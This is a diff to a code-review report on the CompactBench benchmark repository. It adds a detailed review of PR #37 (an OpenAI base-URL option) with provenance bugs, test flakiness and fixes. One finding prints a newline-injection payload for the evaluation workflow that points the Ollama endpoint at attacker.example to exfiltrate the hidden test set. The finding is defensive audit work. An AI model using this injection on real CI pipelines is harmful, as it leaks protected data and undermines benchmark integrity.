@@ -4,7 +4,7 @@
 > the six claims in *Reproduced first-hand* were re-run by hand. Findings not marked as reproduced are
 > reviewer-reported and should be confirmed before acting on the larger ones.
 
-**45 P0 · 102 P1 · 51 P2** — 127 days since last commit, 0 leaderboard rows, 479 tests passing.
+**47 P0 · 105 P1 · 53 P2** — 127 days since last commit, 0 leaderboard rows, 479 tests passing.
 
 ## The verdict
 
@@ -32,6 +32,46 @@ Fix the scorer before publishing results.
 | 5 | "Elite" transcripts are 531 tokens | Measured with the repo's tokenizer: easy 134.6 / medium 187.4 / hard 303.1 / elite 531.1 mean. The regime claimed begins ~100k. |
 | 6 | Docs describe a different project | README says 3 families / 15 templates; CLI reports 4 / 20. Cost catalogue names retired models. `[Unreleased]` empty across 15 PRs. |
 
+## Second pass on PR #37
+
+A separate line-by-line review of the open contribution surfaced material this review missed.
+All of it was re-verified against the PR branch. Where the two disagree, the second is right.
+
+The PR is careful work: it branches directly off current main (`8bb1f62`), its own suite is green on a
+clean environment (19 passed), and it mirrors the `OllamaProvider` precedent correctly. It is **not a
+draft** (`draft: false`) — opened and marked ready five minutes apart on 5 Aug, review-requested with
+zero reviews since. If it was filed mentally as "draft, not my turn," that is why it went quiet.
+
+| # | Finding | Verified |
+|---|---------|----------|
+| 1 | **Leaderboard segmentation is the real problem.** `projection.py` ranks within `(benchmark_version, target_provider, target_model, scorer_version)`. A self-hosted run still reports `target_provider="openai"`, so a local vLLM Llama submitted as `--model gpt-4o` lands in the genuine gpt-4o segment. | ✅ docstring says so explicitly; `RunResult` is `extra="forbid"` |
+| 2 | **The provenance flag goes into a dict nothing reads.** `CompletionResponse.raw` has exactly one consumer — `counting.py:72`, cache keys only. The PR ships a docs sentence claiming a results file records it. That sentence is false. | ✅ grepped every consumer |
+| 3 | **Empty-string env var inverts the flag.** Client gated on truthiness, flag on identity. `BASE_URL=""` → real OpenAI endpoint, flag reports `True`. | ✅ reproduced on PR branch |
+| 4 | **Destabilises a pre-existing test.** `test_requires_api_key` becomes env-sensitive. main+env → 13 passed; PR+env → 1 failed, 18 passed; PR+clean → 19 passed. `conftest.py` has zero env isolation. | ✅ reproduced both directions |
+| 5 | No base-URL validation (`localhost:8000/v1` → `localhost:8000/v1/`; `"   "` → `%20%20%20/`), and no log line on silent redirect. | ✅ all four inputs accepted |
+| 6 | Docs table row reads as an alternative to the API key rather than an addition. | ✅ from the diff |
+
+**Answer to the author's question** ("boolean or full URL?"): neither, where it currently sits. Keep the
+boolean, move it to the run contract. Their reasoning about not storing internal hostnames in shared
+results files is correct and should be preserved.
+
+### Not caused by this PR — hidden set exfiltrable with no code execution
+
+`evaluate-submission.yml` interpolates five unvalidated submitter YAML values into `cfg.env`, then
+`cat cfg.env >> "$GITHUB_ENV"`. A newline in `runtime.model` injects arbitrary job-wide env vars:
+
+```
+MODEL=llama3.2
+COMPACTBENCH_OLLAMA_BASE_URL=http://attacker.example
+X=y
+```
+
+`OllamaProvider` passes that to `AsyncClient(host=...)`, so with `provider: ollama` the runner POSTs
+every hidden ranked case to the attacker as a prompt. **No submitter code runs** — sandboxing `method.py`
+or the dependency install does not stop it. `validate_submissions.py` only greps for `FILL_ME`.
+This already works on main; #37 adds a more natural-looking door but creates nothing new.
+**Fix the workflow; do not hold #37 hostage to it.** Nothing has been exposed — `submissions/` is empty.
+
 ## The order of work
 
 ### Phase 1 — earn the right to be looked at (week 1–2)
@@ -39,7 +79,7 @@ Fix the scorer before publishing results.
 - Cut **0.2.0** from current main; add a release gate that installs the wheel into a clean venv and asserts `compactbench suites list` exits 0.
 - Fix the evaluate workflow's shallow checkout; create the `evaluate` label (it does not exist in the repo).
 - Answer **issue #38** with a dated commitment.
-- Merge **PR #37** (OpenAI `base_url`) — only outside contribution, 19 days waiting, unlocks vLLM/llama.cpp/LM Studio/OpenRouter. Note it has never had CI run: fork workflows need first-time-contributor approval.
+- Merge **PR #37** (OpenAI `base_url`), with three small fixes first — only outside contribution, 19 days waiting, unlocks vLLM/llama.cpp/LM Studio/OpenRouter. It is *not* a draft and it is current with main; it has simply never had CI run (fork workflows need first-time-contributor approval). Fix first: the empty-string provenance bug, the destabilised `test_requires_api_key`, and the docs sentence describing a flag nothing records. See *Second pass on PR #37*.
 - Clear the 6 dependabot PRs; re-sync `uv.lock` (untouched since the scaffold commit).
 - Update the README to the project that exists: four families, six providers, current models.
 
@@ -52,6 +92,7 @@ Fix the scorer before publishing results.
 - Scale transcripts to 50–200k tokens; build an `agent_trace` suite from real trajectories.
 - Recalibrate the compression floors (Elite-Mid currently demands a ≤41-token artifact — every honest submission is auto-disqualified).
 - Bind provenance: re-derive aggregates from the event log in CI; refuse hand-edited results.
+- Add **endpoint provenance** to `RunStartEvent`/`RunResult` and to the leaderboard segment tuple **before** generating any baselines — otherwise self-hosted runs get ranked against genuine hosted runs on your own board.
 - **Then** publish baselines — ~$37 for the full 4×4 matrix by the repo's own projector.
 
 ### Phase 3 — earn citations (this quarter)
@@ -80,7 +121,7 @@ position — but only from a scorer that survives review.
 
 ## Full register
 
-All 198 findings by area, sorted by severity. Effort: S = hours, M = days, L = weeks.
+All 205 findings by area, sorted by severity. Effort: S = hours, M = days, L = weeks.
 
 ### Release & staleness
 
@@ -959,3 +1000,38 @@ CompactBench has a real thesis and a well-engineered skeleton, but it is positio
   - *Evidence:* src/compactbench/dsl/generators.py: 36 first names (_FIRST_NAMES), 25 action phrases (_ACTION_PHRASES), 20 project nouns (_PROJECT_NOUNS), 20 org names (_ORG_NAMES). src/compactbench/engine/distractors.py: 15 user distractors and 10 assistant distractors. Every case in every suite — public and hidden — is a substitution over these fixed lists. The hidden ranked templates differ only in sentence scaffolding, not vocabulary.
   - *Why:* docs/elite-program.md sells the hidden set as the anti-overfitting defense, and docs/faq.md:47-51 says "if you've only ever prompted against the public set, the ranked set is your first honest test." With a 25-item forbidden-action vocabulary shared between public and hidden, a method can enumerate the entire space from the public repo and pattern-match. The defense is weaker than advertised.
   - *Fix:* Either expand the lexicons by an order of magnitude and hold out a disjoint hidden vocabulary (cheap: generate candidate phrases offline, hand-filter, keep half private), or drop the anti-overfitting claim in docs/elite-program.md and docs/faq.md to what is actually true. Given the recommendation to freeze the hidden-set apparatus this quarter, honest scoping of the claim is the cheaper and more credible option now; real vocabulary holdout can wait until submissions exist.
+
+### PR #37
+
+*Line-by-line review of the open contribution — 7 findings*
+
+A separate line-by-line review of PR #37 surfaced material this review missed. The PR itself is careful work — I re-verified it branches off current main (8bb1f62), passes its own suite clean, and correctly mirrors the OllamaProvider precedent. But its provenance mechanism is inert, and the reason that matters is leaderboard segmentation: self-hosted runs are ranked against genuine hosted runs and the only signal that would separate them is discarded. Two confirmed bugs, three minor gaps, and — separately, not caused by this PR — an exfiltration channel that needs no code execution at all.
+
+- **[P0 · RISK · M]** Self-hosted runs are ranked in the same segment as genuine hosted runs
+  - *Evidence:* leaderboard/projection.py:82-99 ranks rows independently within each `(benchmark_version, target_provider, target_model, scorer_version)` segment — the docstring says so explicitly, 'so Llama 3.3 70B methods never compete numerically with Claude 3.5 Haiku methods.' With PR #37, a run against a self-hosted vLLM endpoint still reports `target_provider="openai"` and whatever string was passed to `--model`. A quantized Llama served locally and submitted as `--provider openai --model gpt-4o` lands in the genuine gpt-4o segment. The one signal that would separate them is `raw['custom_base_url']`, which is discarded (see next finding). `RunResult` (contracts/result.py:106) is `extra="forbid"`, so adding provenance is a deliberate contract change, not an accident.
+  - *Why:* Comparability is the entire value proposition of a leaderboard. This becomes urgent the moment the issue #38 plan is acted on: generating free baselines on self-hosted models is the right move, but publishing them without a provenance field mixes self-hosted numbers into hosted segments on your own board — self-inflicted, and very hard to walk back once published. Related and smaller: `_assert_resume_compatible` (runner/run.py) guards resume on provider and model but not endpoint, so a run half-executed against real gpt-4o can be resumed against a local server under the same alias and the guard passes.
+  - *Fix:* Settle this before merging, since it is a contract change: add an endpoint-provenance field to `RunStartEvent` and `RunResult` (e.g. `endpoint_kind: Literal['default','custom']`, sourced from the provider instance at run.py:76), include it in the leaderboard segment tuple in projection.py:88-99, surface it as a column on the public row, and add it to the `_assert_resume_compatible` guard. Then generate the baselines. Offer this to jaaabir as the follow-up — it is the layer their instinct was pointing at.
+- **[P0 · RISK · M]** Hidden ranked set can be exfiltrated with no code execution, by redirecting the provider endpoint
+  - *Evidence:* Not caused by PR #37 — this already works on main. The 'Resolve submission config' step in evaluate-submission.yml:109-129 interpolates five unvalidated submitter-controlled YAML values into `cfg.env` via f-strings, then does `cat cfg.env >> "$GITHUB_ENV"`. A newline inside `runtime.model` therefore injects arbitrary job-wide environment variables; I reproduced the exact cfg.env shape. Because `OllamaProvider` reads `COMPACTBENCH_OLLAMA_BASE_URL` and passes it straight to `AsyncClient(host=...)` (providers/ollama.py:41-44), a submission with `runtime.provider: ollama` and an injected `COMPACTBENCH_OLLAMA_BASE_URL=http://attacker/` causes the runner to POST every hidden ranked case to the attacker as a prompt. `scripts/validate_submissions.py` only greps for the string `FILL_ME` — it performs zero value validation. PR #37 adds a second, more natural-looking door (`provider: openai` in a submission config looks unremarkable in a way that `ollama` pointed at a remote host does not) but creates nothing new.
+  - *Why:* This is the asset the entire leaderboard's integrity rests on, and this path needs no submitter code to run — so it defeats any mitigation that only sandboxes `method.py` or the `requirements.txt` install. It is a strictly cleaner exfiltration channel than the pwn-request path already in this review, and it is the one to design against. Nothing has been exposed: `submissions/` is empty and the board has zero entries, so there is a window before the first real submission.
+  - *Fix:* Stop writing submitter data into `$GITHUB_ENV` entirely — pass the values as explicit arguments, or write them to `$GITHUB_OUTPUT` with proper delimiters after validation. Validate every config value against a strict allow-list (`provider` from the registered provider keys, `model` matched against `^[A-Za-z0-9._:-]+$`, numerics coerced to int with bounds) and reject anything containing a newline. Add an egress allow-list to the evaluation job. Do not hold PR #37 hostage to this: the hole predates it, and the fix belongs in the workflow.
+- **[P1 · BUG · S]** custom_base_url is written into a dict nothing reads, and the PR documents it as if it worked
+  - *Evidence:* I grepped every consumer of `CompletionResponse.raw`: it is read in exactly one place in the codebase — `providers/counting.py:72` via `_extract_cached_tokens`, which reads only `cache_read_input_tokens`, `cached_tokens`, `cache_read_tokens` (counting.py:42). Nothing else touches `.raw`; runner/continuation.py and runner/evaluation.py use only `.text`, `.prompt_tokens`, `.completion_tokens`. Nothing serializes it, and `RunResult` is `extra="forbid"` with no field for it. So `raw['custom_base_url']` is unobservable outside a direct library call. The PR nonetheless ships this sentence into docs/getting-started.md: 'Runs against a custom base URL are flagged in each response's `raw.custom_base_url`, so a results file records that it did not go to OpenAI.' That sentence is false as written — no results file records it.
+  - *Why:* It would ship as documentation, and it is the specific decision the author asked for review on ('happy to drop this or make it the full URL if you'd rather'). The instinct is right and the layer is wrong: the answer to 'boolean or full URL?' is neither, where it currently sits. Left as-is it is a false assurance to exactly the reviewer who would rely on it.
+  - *Fix:* Answer the author's question directly on the thread: keep the boolean, move it to the run contract (previous finding), and drop the docs sentence until it is true. Do not ask them to make it the full URL — their reasoning about internal hostnames in shared results files is correct.
+- **[P1 · BUG · S]** An empty-string base-URL env var marks a genuine OpenAI run as not-OpenAI
+  - *Evidence:* The two gates disagree. `providers/openai.py` resolves `resolved_url = base_url or os.environ.get('COMPACTBENCH_OPENAI_BASE_URL')`, then gates the client on truthiness (`if resolved_url: kwargs['base_url'] = resolved_url`) but gates the flag on identity (`'custom_base_url': self._base_url is not None`). With `COMPACTBENCH_OPENAI_BASE_URL=""`, `resolved_url` is `''` — falsy, so no base_url reaches the SDK — but `'' is not None` is True. I reproduced it on the PR branch: `client.base_url` is `https://api.openai.com/v1/` while the flag reports `True`.
+  - *Why:* It lies in the direction that matters — it marks a real hosted OpenAI run as self-hosted, which is precisely the misattribution the flag exists to prevent. Empty-string env vars are routine: `docker run -e COMPACTBENCH_OPENAI_BASE_URL`, a `.env` with a bare `VAR=`, an unset CI secret interpolated into an env block.
+  - *Fix:* One line: `self._base_url = resolved_url or None`. Add a regression test pinning the empty-string case.
+- **[P1 · BUG · S]** PR #37 makes a pre-existing test env-sensitive, for exactly the user the feature serves
+  - *Evidence:* Making the key requirement conditional on the base URL destabilized the pre-existing `test_requires_api_key` (tests/unit/test_providers_openai.py:50-51), which delenvs only `COMPACTBENCH_OPENAI_API_KEY`, not the base URL. Verified both ways: on main with `COMPACTBENCH_OPENAI_BASE_URL` exported, 13 passed; on the PR branch with the same env exported, `test_requires_api_key` fails with 'DID NOT RAISE ProviderError' (1 failed, 18 passed). With a clean env the PR suite is green (19 passed). The author clearly knew about this failure mode — their own `test_default_client_is_not_flagged_as_custom` delenvs the base URL with a comment explaining why — they just didn't apply it to the test their change destabilized. `tests/conftest.py` has no environment isolation at all (zero `COMPACTBENCH_` references).
+  - *Why:* The developer most likely to have that variable exported is the local-vLLM user this feature exists to serve. They clone, run pytest, and see a failure that has nothing to do with their change. CI would never catch it because CI has a clean environment.
+  - *Fix:* Add the `delenv` to `test_requires_api_key`, or better, fix it durably: an autouse fixture in tests/conftest.py that clears every `COMPACTBENCH_*` variable for the whole suite. The second is a few lines and removes a whole class of future flakiness.
+- **[P2 · GAP · S]** No base-URL validation and no log line on redirect
+  - *Evidence:* I passed four values through the PR branch: `'localhost:8000/v1'` (missing scheme — a likely typo) is silently accepted as `'localhost:8000/v1/'`; `'   '` becomes `'%20%20%20/'`; `'not a url'` becomes `'not%20a%20url/'`; all construct without error and fail later with a confusing SDK-level message. Separately, with the env var exported and a real key present, `OpenAIProvider()` silently sends everything to the custom endpoint with no log line at construction.
+  - *Why:* A scheme-less typo is the single most likely mistake for this feature's audience, and it surfaces as an opaque connection error mid-run rather than at construction. Given the integrity stakes around where a benchmark run actually went, one line announcing the redirect is cheap insurance.
+  - *Fix:* Validate the scheme at construction and raise `ProviderError` with the offending value; emit one INFO line naming the host (not the full URL) when a custom endpoint is in use.
+- **[P2 · GAP · S]** Docs table lists the base URL as an alternative to the API key rather than an addition
+  - *Evidence:* The PR adds a row to the provider table in docs/getting-started.md: `| OpenAI-compatible | openai | COMPACTBENCH_OPENAI_BASE_URL | depends on the server |`. The column is headed 'Env var' and every other row in it holds an API key, and the row's `--provider` key is still `openai` — so it reads as a substitute for `COMPACTBENCH_OPENAI_API_KEY` rather than an additional variable used alongside it.
+  - *Why:* Minor, but it is the table a new user scans to decide how to configure a provider, and the misreading costs them a failed run.
+  - *Fix:* Merge the row into the existing OpenAI row, or retitle the column and note that the base URL is additional. The prose admonition below the table is already correct — only the table row misleads.
